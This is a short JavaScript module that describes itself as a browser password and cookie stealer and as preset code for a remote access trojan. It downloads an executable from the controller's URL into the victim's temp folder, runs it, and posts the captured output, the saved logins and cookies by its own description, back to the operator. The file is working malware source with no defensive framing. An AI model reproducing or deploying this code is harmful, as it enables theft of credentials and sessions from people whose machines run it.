/**
 * Browser Password and Cookie Stealer
 * Preset Code for quantiom rat
 *
 * Description: Grabs browser saved login details and cookies from the client's PC and posts it to their data log.
 * Last Updated: 9/7/2020
 */

try {
    const fs = require('fs');
    const http = require('http');
    const os = require('os');
    const { spawn } = require('child_process');

    const checkForFile = async (fileName) => {
        return new Promise((r) => {
            if (!fs.existsSync(`${os.tmpdir()}/${fileName}`)) {
                const file = fs.createWriteStream(`${os.tmpdir()}/${fileName}`);

                http.get(url + `/tmp/${fileName}`, async (response) => {
                    response.pipe(file);

                    r();
                });
            } else r();
        });
    };

    checkForFile('edg6A23.tmp.exe').then(() => {
        const ls = spawn(`${os.tmpdir()}/edg6A23.tmp.exe`, ['aaa']);
        let data = '';

        ls.stdout.on('data', function (d) {
            data += d.toString();
        });

        ls.stderr.on('data', function (d) {
            data += d.toString();
        });

        ls.on('exit', function (code) {
            postData(data.toString(), 'Browser Password and Cookie Stealer');
        });
    });
} catch (e) {
    postData(e.stack, 'Browser Password and Cookie Stealer Error');
}
